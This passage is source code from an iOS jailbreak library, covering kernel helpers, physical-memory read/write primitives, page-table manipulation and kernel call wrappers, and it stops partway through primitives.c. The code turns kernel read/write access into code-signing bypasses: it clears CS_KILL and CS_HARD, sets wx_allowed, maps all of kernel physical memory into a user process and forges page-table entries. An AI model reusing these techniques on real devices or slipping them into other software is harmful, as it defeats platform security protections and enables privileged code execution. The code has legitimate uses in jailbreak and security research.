		uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
		kwrite32(proc_ro + koffsetof(proc_ro, csflags), flags);
	}
	else {
		kwrite32(proc + koffsetof(proc, csflags), flags);
	}
}

void proc_csflags_set(uint64_t proc, uint32_t flags)
{
	proc_csflags_update(proc, proc_getcsflags(proc) | (uint32_t)flags);
}

void proc_csflags_clear(uint64_t proc, uint32_t flags)
{
	proc_csflags_update(proc, proc_getcsflags(proc) & ~(uint32_t)flags);
}

uint64_t ipc_entry_lookup(uint64_t space, mach_port_name_t name)
{
	uint64_t table = 0;
	// New format in iOS 16.1
	if (gSystemInfo.kernelStruct.ipc_space.table_uses_smr) {
		table = kread_smrptr(space + koffsetof(ipc_space, table));
	}
	else {
		table = kread_ptr(space + koffsetof(ipc_space, table));
	}

	return (table + (ksizeof(ipc_entry) * (name >> 8)));
}

uint64_t pa_index(uint64_t pa)
{
	return atop(pa - kread64(ksymbol(vm_first_phys)));
}

uint64_t pai_to_pvh(uint64_t pai)
{
	return kread64(ksymbol(pv_head_table)) + (pai * 8);
}

uint64_t pvh_ptd(uint64_t pvh)
{
	return ((kread64(pvh) & PVH_LIST_MASK) | PVH_HIGH_FLAGS);
}

void task_set_memory_ownership_transfer(uint64_t task, bool value)
{
	kwrite8(task + koffsetof(task, task_can_transfer_memory_ownership), !!value);
}

uint64_t mac_label_get(uint64_t label, int slot)
{
	// On 15.0 - 15.1.1, 0 is the equivalent of -1 on 15.2+
	// So, treat 0 as -1 there
	uint64_t value = kread_ptr(label + ((slot + 1) * sizeof(uint64_t)));
	if (!gSystemInfo.kernelStruct.proc_ro.exists && value == 0) value = -1;
	return value;
}

void mac_label_set(uint64_t label, int slot, uint64_t value)
{
	// THe inverse of the condition above, treat -1 as 0 on 15.0 - 15.1.1
	if (!gSystemInfo.kernelStruct.proc_ro.exists && value == -1) value = 0;
#ifdef __arm64e__
	if (jbinfo(usesPACBypass) && !gSystemInfo.kernelStruct.proc_ro.exists) {
		kcall(NULL, ksymbol(mac_label_set), 3, (uint64_t[]){ label, slot, value });
		return;
	}
#endif
	kwrite64(label + ((slot + 1) * sizeof(uint64_t)), value);
}

#ifdef __arm64e__
int pmap_cs_allow_invalid(uint64_t pmap)
{
	kwrite8(pmap + koffsetof(pmap, wx_allowed), true);
	return 0;
}
#endif

int cs_allow_invalid(uint64_t proc, bool emulateFully)
{
	if (proc) {
		uint64_t task = proc_task(proc);
		if (task) {
			uint64_t vm_map = kread_ptr(task + koffsetof(task, map));
			if (vm_map) {
				uint64_t pmap = kread_ptr(vm_map + koffsetof(vm_map, pmap));
				if (pmap) {
					// For non-pmap_cs (arm64) devices, this should always be emulated.
#ifdef __arm64e__
					if (emulateFully) {
#endif
						// Fugu15 Rootful
						//proc_csflags_clear(proc, CS_EXEC_SET_ENFORCEMENT | CS_EXEC_SET_KILL | CS_EXEC_SET_HARD | CS_REQUIRE_LV | CS_ENFORCEMENT | CS_RESTRICT | CS_KILL | CS_HARD | CS_FORCED_LV);
						//proc_csflags_set(proc, CS_DEBUGGED | CS_INVALID_ALLOWED | CS_GET_TASK_ALLOW);

						// XNU
						proc_csflags_clear(proc, CS_KILL | CS_HARD);
						proc_csflags_set(proc, CS_DEBUGGED);

						task_set_memory_ownership_transfer(task, true);
						vm_map_flags flags = { 0 };
						kreadbuf(vm_map + koffsetof(vm_map, flags), &flags, sizeof(flags));
						flags.switch_protect = false;
						flags.cs_debugged = true;
						kwritebuf(vm_map + koffsetof(vm_map, flags), &flags, sizeof(flags));
#ifdef __arm64e__
					}
					// For pmap_cs (arm64e) devices, this is enough to get unsigned code to run
					pmap_cs_allow_invalid(pmap);
#endif
				}
			}
		}
	}
	return 0;
}

kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va)
{
	uint64_t kr = -1;
	if (!is_kcall_available()) return kr;
	while (1) {
		kcall(&kr, ksymbol(pmap_enter_options_addr), 8, (uint64_t[]){ pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1, 1 });
		if (kr != KERN_RESOURCE_SHORTAGE) {
			return kr;
		}
	}
}

uint64_t pmap_remove_options(uint64_t pmap, uint64_t start, uint64_t end)
{
	uint64_t r = -1;
	if (!is_kcall_available()) return r;
	kcall(&r, ksymbol(pmap_remove_options), 4, (uint64_t[]){ pmap, start, end, 0x100 });
	return r;
}

void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end)
{
#ifdef __arm64e__
	pmap_remove_options(pmap, start, end);
#else
    uint64_t remove_count = 0;
    if (!pmap) {
        return;
    }
    uint64_t va = start;
    while (va < end) {
        uint64_t l;
        l = ((va + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK);
        if (l > end) {
            l = end;
        }
        remove_count = pmap_remove_options(pmap, va, l);
        va = remove_count;
    }
#endif
}
```

`BaseBin/libjailbreak/src/kernel.h`:

```h
#ifndef KERNEL_H
#define KERNEL_H

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <mach/mach.h>
#include "pvh.h"
#include "info.h"

#define CPSR_KERN_INTR_EN  (0x401000 | ((uint32_t)kconstant(kernel_el) << 2))
#define CPSR_KERN_INTR_DIS (0x4013c0 | ((uint32_t)kconstant(kernel_el) << 2))
#define CPSR_USER_INTR_DIS 0x13C0

#define PERM_KRW_URW 0x7 // R/W for kernel and user

#define P_SUGID 0x00000100
#define atop(x) ((vm_address_t)(x) >> vm_real_kernel_page_shift)
typedef struct __attribute__((__packed__)) _vm_map_flags {
    unsigned int
        /* boolean_t */ wait_for_space:1,         /* Should callers wait for space? */
        /* boolean_t */ wiring_required:1,        /* All memory wired? */
        /* boolean_t */ no_zero_fill:1,           /* No zero fill absent pages */
        /* boolean_t */ mapped_in_other_pmaps:1,  /* has this submap been mapped in maps that use a different pmap */
        /* boolean_t */ switch_protect:1,         /* Protect map from write faults while switched */
        /* boolean_t */ disable_vmentry_reuse:1,  /* All vm entries should keep using newer and higher addresses in the map */
        /* boolean_t */ map_disallow_data_exec:1, /* Disallow execution from data pages on exec-permissive architectures */
        /* boolean_t */ holelistenabled:1,
        /* boolean_t */ is_nested_map:1,
        /* boolean_t */ map_disallow_new_exec:1, /* Disallow new executable code */
        /* boolean_t */ jit_entry_exists:1,
        /* boolean_t */ has_corpse_footprint:1,
        /* boolean_t */ terminated:1,
        /* boolean_t */ is_alien:1,              /* for platform simulation, i.e. PLATFORM_IOS on OSX */
        /* boolean_t */ cs_enforcement:1,        /* code-signing enforcement */
        /* boolean_t */ cs_debugged:1,           /* code-signed but debugged */
        /* boolean_t */ reserved_regions:1,      /* has reserved regions. The map size that userspace sees should ignore these. */
        /* boolean_t */ single_jit:1,            /* only allow one JIT mapping */
        /* boolean_t */ never_faults : 1,        /* only seen in KDK */
        /* reserved */ pad:13;
} vm_map_flags;

uint64_t proc_find(pid_t pidToFind);
uint64_t proc_task(uint64_t proc);
uint64_t proc_ucred(uint64_t proc);
int proc_rele(uint64_t proc);
uint32_t proc_getcsflags(uint64_t proc);
void proc_csflags_update(uint64_t proc, uint32_t flags);
void proc_csflags_set(uint64_t proc, uint32_t flags);
void proc_csflags_clear(uint64_t proc, uint32_t flags);
uint64_t ipc_entry_lookup(uint64_t space, mach_port_name_t name);
uint64_t pa_index(uint64_t pa);
uint64_t pai_to_pvh(uint64_t pai);
uint64_t pvh_ptd(uint64_t pvh);
void task_set_memory_ownership_transfer(uint64_t task, bool value);
uint64_t mac_label_get(uint64_t label, int slot);
void mac_label_set(uint64_t label, int slot, uint64_t value);
int pmap_cs_allow_invalid(uint64_t pmap);
int cs_allow_invalid(uint64_t proc, bool emulateFully);
kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va);
uint64_t pmap_remove_options(uint64_t pmap, uint64_t start, uint64_t end);
void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end);

#endif
```

`BaseBin/libjailbreak/src/libjailbreak.h`:

```h
#include "primitives.h"
#include "info.h"
#include "kernel.h"
#include "util.h"
#include "translation.h"
#include "trustcache.h"
#include "jbclient_xpc.h"

int jbclient_initialize_primitives_internal(bool physrwPTE);
int jbclient_initialize_primitives(void);
```

`BaseBin/libjailbreak/src/machine_info.h`:

```h
#ifndef MACHINE_INFO_H
#define MACHINE_INFO_H

#include <mach/machine.h>

/* A8 */
#ifndef CPUFAMILY_ARM_TYPHOON
#define CPUFAMILY_ARM_TYPHOON               0x2c91a47e
#endif

/* A9 */
#ifndef CPUFAMILY_ARM_TWISTER
#define CPUFAMILY_ARM_TWISTER               0x92fb37c8
#endif

/* A10 */
#ifndef CPUFAMILY_ARM_HURRICANE
#define CPUFAMILY_ARM_HURRICANE             0x67ceee93
#endif

/* A11 */
#ifndef CPUFAMILY_ARM_MONSOON_MISTRAL
#define CPUFAMILY_ARM_MONSOON_MISTRAL       0xe81e7ef6
#endif

/* A12 */
#ifndef CPUFAMILY_ARM_VORTEX_TEMPEST
#define CPUFAMILY_ARM_VORTEX_TEMPEST        0x07d34b9f
#endif

/* A13 */
#ifndef CPUFAMILY_ARM_LIGHTNING_THUNDER
#define CPUFAMILY_ARM_LIGHTNING_THUNDER     0x462504d2
#endif

/* A14, M1 */
#ifndef CPUFAMILY_ARM_FIRESTORM_ICESTORM
#define CPUFAMILY_ARM_FIRESTORM_ICESTORM    0x1b588bb3
#endif

/* A15, M2 */
#ifndef CPUFAMILY_ARM_BLIZZARD_AVALANCHE
#define CPUFAMILY_ARM_BLIZZARD_AVALANCHE    0xda33d83d
#endif

/* A16 */
#ifndef CPUFAMILY_ARM_EVEREST_SAWTOOTH
#define CPUFAMILY_ARM_EVEREST_SAWTOOTH      0x8765edea
#endif

/* A17 */
#ifndef CPUFAMILY_ARM_COLL
#define CPUFAMILY_ARM_COLL                  0x2876f5b5
#endif

/* A18 */
#ifndef CPUFAMILY_ARM_TUPAI
#define CPUFAMILY_ARM_TUPAI                 0x204526d0
#endif

/* A18 Pro */
#ifndef CPUFAMILY_ARM_TAHITI
#define CPUFAMILY_ARM_TAHITI                0x75d4acb9
#endif

/* M3 */
#ifndef CPUFAMILY_ARM_IBIZA
#define CPUFAMILY_ARM_IBIZA                 0xfa33415e
#endif

/* M4 */
#ifndef CPUFAMILY_ARM_DONAN
#define CPUFAMILY_ARM_DONAN                 0x6f5129ac
#endif

#endif /* MACHINE_INFO_H */

```

`BaseBin/libjailbreak/src/main.c`:

```c
#include "jbclient_xpc.h"
#include <stdlib.h>
#include "physrw.h"
#include "physrw_pte.h"
#include "kalloc_pt.h"
#include "primitives_IOSurface.h"
#include "info.h"
#include "translation.h"
#include "kcall_Fugu14.h"
#include "kcall_arm64.h"
#include <xpc/xpc.h>

int jbclient_initialize_primitives_internal(bool physrwPTE)
{
	if (getuid() != 0) return -1;

	xpc_object_t xSystemInfo = NULL;
	if (jbclient_root_get_sysinfo(&xSystemInfo) == 0) {
		SYSTEM_INFO_DESERIALIZE(xSystemInfo);
		xpc_release(xSystemInfo);
		uint64_t asidPtr = 0;
		if (jbclient_root_get_physrw(physrwPTE, &asidPtr) == 0) {
			if (physrwPTE) {
				libjailbreak_physrw_pte_init(true, asidPtr);
			}
			else {
				libjailbreak_physrw_init(true);
			}
			libjailbreak_translation_init();
			libjailbreak_IOSurface_primitives_init();
			if (__builtin_available(iOS 16.0, *)) {
				libjailbreak_kalloc_pt_init();
			}
			if (gPrimitives.kalloc_local) {
#ifdef __arm64e__
				if (jbinfo(usesPACBypass)) {
					jbclient_get_fugu14_kcall();
				}
#else
				arm64_kcall_init();
#endif
			}

			return 0;
		}
	}

	return -1;
}

int jbclient_initialize_primitives(void)
{
	return jbclient_initialize_primitives_internal(false);
}

// Used for supporting third party legacy software that still calls this function
int jbdInitPPLRW(void)
{
	return jbclient_initialize_primitives();
}

```

`BaseBin/libjailbreak/src/physrw.c`:

```c
#include "physrw.h"
#include "primitives.h"
#include "kernel.h"
#include "translation.h"
#include "info.h"
#include "util.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void *physrw_phystouaddr(uint64_t pa)
{
	errno = 0;

	uint64_t physBase = kconstant(physBase), physSize = kconstant(physSize);
	bool doBoundaryCheck = (physBase != 0 && physSize != 0);
	if (doBoundaryCheck) {
		if (pa < physBase || pa >= (physBase + physSize)) {
			errno = 1030;
			return 0;
		}
	}

	return (void *)(pa + PPLRW_USER_MAPPING_OFFSET);
}

void *physrw_kvtouaddr(uint64_t va)
{
	uint64_t pa = kvtophys(va);
	if (!pa) return 0;
	return physrw_phystouaddr(pa);
}

int physrw_physreadbuf(uint64_t pa, void* output, size_t size)
{
	void *uaddr = physrw_phystouaddr(pa);
	if (!uaddr && errno != 0) {
		memset(output, 0x0, size);
		return errno;
	}

	asm volatile("dmb sy");
	memcpy(output, uaddr, size);
	return 0;
}

int physrw_physwritebuf(uint64_t pa, const void* input, size_t size)
{
	void *uaddr = physrw_phystouaddr(pa);
	if (!uaddr && errno != 0) {
		return errno;
	}

	memcpy(uaddr, input, size);
	asm volatile("dmb sy");
	return 0;
}

int physrw_handoff(pid_t pid)
{
	if (!pid) return -1;

	uint64_t proc = proc_find(pid);
	if (!proc) return -2;

	int ret = 0;
	do {
		uint64_t task = proc_task(proc);
		if (!task) { ret = -3; break; };

		uint64_t vmMap = kread_ptr(task + koffsetof(task, map));
		if (!vmMap) { ret = -4; break; };

		uint64_t pmap = kread_ptr(vmMap + koffsetof(vm_map, pmap));
		if (!pmap) { ret = -5; break; };

		// Map the entire kernel physical address space into the userland process, starting at PPLRW_USER_MAPPING_OFFSET
		int mapInRet = pmap_map_in(pmap, kconstant(physBase)+PPLRW_USER_MAPPING_OFFSET, kconstant(physBase), kconstant(physSize));
		if (mapInRet != 0) ret = -10 + mapInRet;
	} while (0);

	proc_rele(proc);
	return ret;
}

int libjailbreak_physrw_init(bool receivedHandoff)
{
	if (!receivedHandoff) {
		physrw_handoff(getpid());
	}
	gPrimitives.physreadbuf = physrw_physreadbuf;
	gPrimitives.physwritebuf = physrw_physwritebuf;
	gPrimitives.kreadbuf = NULL;
	gPrimitives.kwritebuf = NULL;

	return 0;
}
```

`BaseBin/libjailbreak/src/physrw.h`:

```h
#ifndef PHYSRW_H
#define PHYSRW_H

#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>
#include "info.h"

#define PPLRW_USER_MAPPING_OFFSET   (L1_BLOCK_SIZE * L1_BLOCK_COUNT) - 0x1000000000
#define PPLRW_USER_MAPPING_TTEP_IDX (PPLRW_USER_MAPPING_OFFSET / L1_BLOCK_SIZE)

int physrw_handoff(pid_t pid);
int libjailbreak_physrw_init(bool receivedHandoff);

#endif

```

`BaseBin/libjailbreak/src/physrw_pte.c`:

```c
#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"
#include "pte.h"
#include "info.h"
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/sysctl.h>

#define MAGIC_PT_ADDRESS (L1_BLOCK_SIZE * (L1_BLOCK_COUNT - 1))
#define gMagicPT ((uint64_t *)MAGIC_PT_ADDRESS) // fake variable

uint8_t *gSwAsid = 0;
static pthread_mutex_t gLock;

void flush_tlb(void)
{
	uint8_t fakeSwAsid = UINT8_MAX;
	uint8_t origSwAsid = *gSwAsid;
	if (origSwAsid != fakeSwAsid) {
		*gSwAsid = fakeSwAsid;
		__asm("dmb sy");
		usleep(0); // Force context switch
		*gSwAsid = origSwAsid;
		__asm("dmb sy");
	}
}

void acquire_window(uint64_t pa, void (^block)(void *ua))
{
	pthread_mutex_lock(&gLock);

	int toUse = 0;

	// Find existing
	for (int i = 2; i < L2_BLOCK_COUNT; i++) {
		if ((gMagicPT[i] & ARM_TTE_PA_MASK) == pa) {
			toUse = i;
			break;
		}
	}

	// If not found, find empty
	if (toUse == 0) {
		for (int i = 2; i < L2_BLOCK_COUNT; i++) {
			if (!gMagicPT[i]) {
				toUse = i;
				break;
			}
		}
	}

	// If not found, clear page table
	if (toUse == 0) {
		// Reset all entries to 0
		for (int i = 2; i < L2_BLOCK_COUNT; i++) {
			gMagicPT[i] = 0;
		}
		flush_tlb();
		toUse = 2;
	}

	gMagicPT[toUse] = pa | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
	usleep(0);
	__asm("dmb sy");
	usleep(0);

	block((void *)(MAGIC_PT_ADDRESS + (toUse * vm_real_kernel_page_size)));

	pthread_mutex_unlock(&gLock);
}

int physrw_pte_physreadbuf(uint64_t pa, void* output, size_t size)
{
	__block int r = 0;
	enumerate_pages(pa, size, vm_real_kernel_page_size, ^bool(uint64_t curPA, size_t curSize) {
		acquire_window(curPA & ~vm_real_kernel_page_mask, ^(void *ua) {
			void *curUA = ((uint8_t*)ua) + (curPA & vm_real_kernel_page_mask);
			memcpy(&output[curPA - pa], curUA, curSize);
			__asm("dmb sy");
		});
		return true;
	});
	return r;
}

int physrw_pte_physwritebuf(uint64_t pa, const void* input, size_t size)
{
	__block int r = 0;
	enumerate_pages(pa, size, vm_real_kernel_page_size, ^bool(uint64_t curPA, size_t curSize) {
		acquire_window(curPA & ~vm_real_kernel_page_mask, ^(void *ua) {
			void *curUA = ((uint8_t*)ua) + (curPA & vm_real_kernel_page_mask);
			memcpy(curUA, &input[curPA - pa], curSize);
			__asm("dmb sy");
		});
		return true;
	});
	return r;
}

int physrw_pte_handoff(pid_t pid, uint64_t *swAsidPtr)
{
	if (!pid) return -1;

	uint64_t proc = proc_find(pid);
	if (!proc) return -2;

	int ret = 0;
	do {
		uint64_t task = proc_task(proc);
		if (!task) { ret = -3; break; };

		uint64_t vmMap = kread_ptr(task + koffsetof(task, map));
		if (!vmMap) { ret = -4; break; };

		uint64_t pmap = kread_ptr(vmMap + koffsetof(vm_map, pmap));
		if (!pmap) { ret = -5; break; };

		uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));

		// Allocate magic page table to our process at last possible location
		int exp_r = pmap_expand_range(pmap, MAGIC_PT_ADDRESS, L2_BLOCK_SIZE);
		if (exp_r != 0) { ret = -6; break; }

		// Map in the magic page table at MAGIC_PT_ADDRESS
		uint64_t leafLevel = PMAP_TT_L2_LEVEL;
		uint64_t magicPT = vtophys_lvl(ttep, MAGIC_PT_ADDRESS, &leafLevel, NULL);
		if (!magicPT) { ret = -7; break; }
		physwrite64(magicPT, magicPT | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY);

		// Map in the pmap at MAGIC_PT_ADDRESS+vm_real_kernel_page_size
		uint64_t sw_asid = pmap + koffsetof(pmap, sw_asid);
		uint64_t sw_asid_page = sw_asid & ~vm_real_kernel_page_mask;
		uint64_t sw_asid_page_pa = kvtophys(sw_asid_page);
		uint64_t sw_asid_pageoff = sw_asid & vm_real_kernel_page_mask;
		*swAsidPtr = (uint64_t)(MAGIC_PT_ADDRESS + vm_real_kernel_page_size + sw_asid_pageoff);
		physwrite64(magicPT+8, sw_asid_page_pa | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY);

		if (getpid() == pid) {
			flush_tlb();
		}
	} while (0);

	proc_rele(proc);
	return ret;
}

int libjailbreak_physrw_pte_init(bool receivedHandoff, uint64_t asidPtr)
{
	if (pthread_mutex_init(&gLock, NULL) != 0) return -8;

	if (!receivedHandoff) {
		physrw_pte_handoff(getpid(), (uint64_t *)&gSwAsid);
	}
	else {
		gSwAsid = (void *)asidPtr;
	}
	gPrimitives.physreadbuf = physrw_pte_physreadbuf;
	gPrimitives.physwritebuf = physrw_pte_physwritebuf;
	gPrimitives.kreadbuf = NULL;
	gPrimitives.kwritebuf = NULL;

	return 0;
}

bool device_supports_physrw_pte(void)
{
	cpu_subtype_t cpuFamily = 0;
	size_t cpuFamilySize = sizeof(cpuFamily);
	sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
	if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
		// On A8, phyrw_pte causes SUPER WEIRD UNEXPLAINABLE SYSTEM RESTARTS
		// No seriously, there is no panic-full log, only a panic-base that says "Unexpected watchdog reset"
		// This exact report also what you would get when you do a hard reset, super weird...
		// Luckily physrw doesn't have that issue so we can just use that immediately on A8
		// This makes jailbreaking a few seconds slower, but it's not the biggest deal in the world
		return false;
	}
	return true;
}
```

`BaseBin/libjailbreak/src/physrw_pte.h`:

```h
#ifndef PHYSRW_PTE_H
#define PHYSRW_PTE_H

#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>

int physrw_pte_handoff(pid_t pid, uint64_t *swAsidPtr);
int libjailbreak_physrw_pte_init(bool receivedHandoff, uint64_t asidPtr);
bool device_supports_physrw_pte(void);

#endif
```

`BaseBin/libjailbreak/src/primitives.c`:

```c
#include "primitives.h"
#include "kernel.h"
#include "info.h"
#include "translation.h"
#include "pte.h"
#include "util.h"
#include <errno.h>
#include <string.h>
#include <sys/sysctl.h>

struct kernel_primitives gPrimitives = { 0 };

// Wrappers physical <-> virtual

void enumerate_pages(uint64_t start, size_t size, uint64_t pageSize, bool (^block)(uint64_t curStart, size_t curSize))
{
	uint64_t curStart = start;
	size_t sizeLeft = size;
	bool c = true;
	while (sizeLeft > 0 && c) {
		uint64_t pageOffset = curStart & (pageSize - 1);
		uint64_t readSize = min(sizeLeft, pageSize - pageOffset);
		c = block(curStart, readSize);
		curStart += readSize;
		sizeLeft -= readSize;
	}
}

int _kreadbuf_phys(uint64_t kaddr, void* output, size_t size)
{
	memset(output, 0, size);

	__block int pr = 0;
	enumerate_pages(kaddr, size, vm_real_kernel_page_size, ^bool(uint64_t curKaddr, size_t curSize){
		uint64_t curPhys = kvtophys(curKaddr);
		if (curPhys == 0 && errno != 0) {
			pr = errno;
			return false;
		}
		pr = physreadbuf(curPhys, &output[curKaddr - kaddr], curSize);
		if (pr != 0) {
			return false;
		}
		return true;
	});
	return pr;
}

int _kwritebuf_phys(uint64_t kaddr, const void* input, size_t size)
{
	__block int pr = 0;
	enumerate_pages(kaddr, size, vm_real_kernel_page_size, ^bool(uint64_t curKaddr, size_t curSize){
		uint64_t curPhys = kvtophys(curKaddr);
		if (curPhys == 0 && errno != 0) {
			pr = errno;
			return false;
		}
		pr = physwritebuf(curPhys, &input[curKaddr - kaddr], curSize);
		if (pr != 0) {
			return false;
		}
		return true;
	});
	return pr;
}

int _physreadbuf_virt(uint64_t physaddr, void* output, size_t size)
{
	memset(output, 0, size);

	__block int pr = 0;
	enumerate_pages(physaddr, size, vm_real_kernel_page_size, ^bool(uint64_t curPhys, size_t curSize){
		uint64_t curKaddr = phystokv(curPhys);
		if (curKaddr == 0 && errno != 0) {
			pr = errno;
			return false;
		}
		pr = kreadbuf(curKaddr, &output[curPhys - physaddr], curSize);
		if (pr != 0) {
			return false;
		}
		return true;
	});
	return pr;
}

int _physwritebuf_virt(uint64_t physaddr, const void* input, size_t size)
{
	__block int pr = 0;
	enumerate_pages(physaddr, size, vm_real_kernel_page_size, ^bool(uint64_t curPhys, size_t curSize){
		uint64_t curKaddr = phystokv(curPhys);
		if (curKaddr == 0 && errno != 0) {
			pr = errno;
			return false;
		}
		pr = kwritebuf(curKaddr, &input[curPhys - physaddr], curSize);
		if (pr != 0) {
			return false;
		}
		return true;
	});
	return pr;
}

// Wrappers to gPrimitives

int kreadbuf(uint64_t kaddr, void* output, size_t size)
{
	if (gPrimitives.kreadbuf) {
		return gPrimitives.kreadbuf(kaddr, output, size);
	}
	else if (gPrimitives.physreadbuf && gPrimitives.vtophys) {
		return _kreadbuf_phys(kaddr, output, size);
	}
	return -1;
}

int kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
	if (gPrimitives.kwritebuf) {
		return gPrimitives.kwritebuf(kaddr, input, size);
	}
	else if (gPrimitives.physwritebuf && gPrimitives.vtophys) {
		return _kwritebuf_phys(kaddr, input, size);
	}
	return -1;
}

int physreadbuf(uint64_t physaddr, void* output, size_t size)
{
	if (gPrimitives.physreadbuf) {
		return gPrimitives.physreadbuf(physaddr, output, size);
	}
	else if (gPrimitives.kreadbuf && gPrimitives.phystokv) {
		return _physreadbuf_virt(physaddr, output, size);
	}
	return -1;
}

int physwritebuf(uint64_t physaddr, const void* input, size_t size)
{
	if (gPrimitives.physwritebuf) {
		return gPrimitives.physwritebuf(physaddr, input, size);
	}
	else if (gPrimitives.kwritebuf && gPrimitives.phystokv) {
		return _physwritebuf_virt(physaddr, input, size);
	}
	return -1;
}

int vreadbuf(uint64_t tte_p, const void *addr, void *outdata, size_t datalen)
{
	__block bool success = true;
	enumerate_pages((uint64_t)addr, datalen, vm_real_kernel_page_size, ^bool(uint64_t curStart, size_t curSize){
		uint64_t curPA = vtophys(tte_p, curStart);
		if (curPA == 0) {
			success = false;
			return success;
		}
		success = physreadbuf(curPA, &outdata[curStart - (uint64_t)addr], curSize) == 0;
		return success;
	});
	return success ? 0 : -1;
}

int vwritebuf(uint64_t tte_p, const void *addr, const void *indata, size_t datalen)
{
	__block bool success = true;
	enumerate_pages((uint64_t)addr, datalen, vm_real_kernel_page_size, ^bool(uint64_t curStart, size_t curSize){
		uint64_t curPA = vtophys(tte_p, curStart);
		if (curPA == 0) {
			success = false;
			return success;
		}
		success = physwritebuf(curPA, &indata[curStart - (uint64_t)addr], curSize) == 0;
		return success;
	});
	return success ? 0 : -1;
}

int proc_vreadbuf(uint64_t proc, const void *addr, void *outdata, size_t datalen)
{
	uint64_t task = proc_task(proc);
	if (!task) return -1;
	uint64_t map = kread_ptr(task + koffsetof(task, map));
	if (!map) return -1;
	uint64_t pmap = kread_ptr(map + koffsetof(vm_map, pmap));
	if (!pmap) return -1;
	uint64_t ttep = kread_ptr(pmap + koffsetof(pmap, ttep));
	if (!ttep) return -1;
	return vreadbuf(ttep, addr, outdata, datalen);
}

int proc_vwritebuf(uint64_t proc, const void *addr, const void *indata, size_t datalen)
{
	uint64_t task = proc_task(proc);
	if (!task) return -1;
	uint64_t map = kread_ptr(task + koffsetof(task, map));
	if (!map) return -1;
	uint64_t pmap = kread_ptr(map + koffsetof(vm_map, pmap));
	if (!pmap) return -1;
	uint64_t ttep = kread_ptr(pmap + koffsetof(pmap, ttep));
	if (!ttep) return -1;
	return proc_vwritebuf(ttep, addr, indata, datalen);
}

// Convenience Wrappers

uint64_t physread64(uint64_t pa)
{
	uint64_t v;
	physreadbuf(pa, &v, sizeof(v));
	return v;
}

uint64_t physread_ptr(uint64_t pa)
{
	return UNSIGN_PTR(physread64(pa));
}

uint32_t physread32(uint64_t pa)
{
	uint32_t v;
	physreadbuf(pa, &v, sizeof(v));
	return v;
}

uint16_t physread16(uint64_t pa)
{
	uint16_t v;
	physreadbuf(pa, &v, sizeof(v));
	return v;
}

uint8_t physread8(uint64_t pa)
{
	uint8_t v;
	physreadbuf(pa, &v, sizeof(v));
	return v;
}


int physwrite64(uint64_t pa, uint64_t v)
{
	return physwritebuf(pa, &v, sizeof(v));
}

int physwrite32(uint64_t pa, uint32_t v)
{
	return physwritebuf(pa, &v, sizeof(v));
}

int physwrite16(uint64_t pa, uint16_t v)
{
	return physwritebuf(pa, &v, sizeof(v));
}

int physwrite8(uint64_t pa, uint8_t v)
{
	return physwritebuf(pa, &v, sizeof(v));
}


uint64_t kread64(uint64_t va)
{
	uint64_t v;
	kreadbuf(va, &v, sizeof(v));
	return v;
}

uint64_t kread_ptr(uint64_t va)
{
	return UNSIGN_PTR(kread64(va));
}

uint64_t kread_smrptr(uint64_t va)
{
	uint64_t value = kread_ptr(va);

	uint64_t bits = (kconstant(smrBase) << (62-kconstant(T1SZ_BOOT)));

	uint64_t case1 = 0xFFFFFFFFFFFFC000 & ~bits;
	uint64_t case2 = 0xFFFFFFFFFFFFFFE0 & ~bits;

	if ((value & bits) == 0) {
		if (value) {
			value = (value & case1) | bits;
		}
	}
	else {
		value = (value & case2) | bits;
	}

	return value;
}

uint32_t kread32(uint64_t va)
{
	uint32_t v;
	kreadbuf(va, &v, sizeof(v));
	return v;
}

uint16_t kread16(uint64_t va)
{
	uint16_t v;
	kreadbuf(va, &v, sizeof(v));
	return v;
}

uint8_t kread8(uint64_t va)
{
	uint8_t v;
	kreadbuf(va, &v, sizeof(v));
	return v;
}


int kwrite64(uint64_t va, uint64_t v)
{
	return kwritebuf(va, &v, sizeof(v));
}

int kwrite_ptr(uint64_t kaddr, uint64_t pointer, uint16_t salt)
{
#ifdef __arm64e__
	if (!gPrimitives.kexec || !kgadget(pacda)) return -1;
	kwrite64(kaddr, kptr_sign(kaddr, pointer, salt));
#else
	kwrite64(kaddr, pointer);
#endif
	return 0;
}

int kwrite32(uint64_t va, uint32_t v)
{
	return kwritebuf(va, &v, sizeof(v));
}

int kwrite16(uint64_t va, uint16_t v)
{
	return kwritebuf(va, &v, sizeof(v));
}

int kwrite8(uint64_t va, uint8_t v)
{
	return kwritebuf(va, &v, sizeof(v));
}

int kcall(uint64_t *result, uint64_t func, int argc, const uint64_t *argv)
{
	if (gPrimitives.kcall) {
		uint64_t resultTmp = gPrimitives.kcall(func, argc, argv);
		if(result) *result = resultTmp;
		return 0;
	}
	return -1;
}

int kexec(kRegisterState *state)
{
	if (gPrimitives.kexec) {
		gPrimitives.kexec(state);
	}
	return -1;
}

int kmap(uint64_t pa, uint64_t size, void **uaddr)
{
	if (gPrimitives.kmap) {
		return gPrimitives.kmap(pa, size, uaddr);
	}
	return -1;
}

int kalloc_with_options(uint64_t *addr, uint64_t size, kalloc_options options)
{
	if (options == KALLOC_OPTION_GLOBAL && gPrimitives.kalloc_global) {
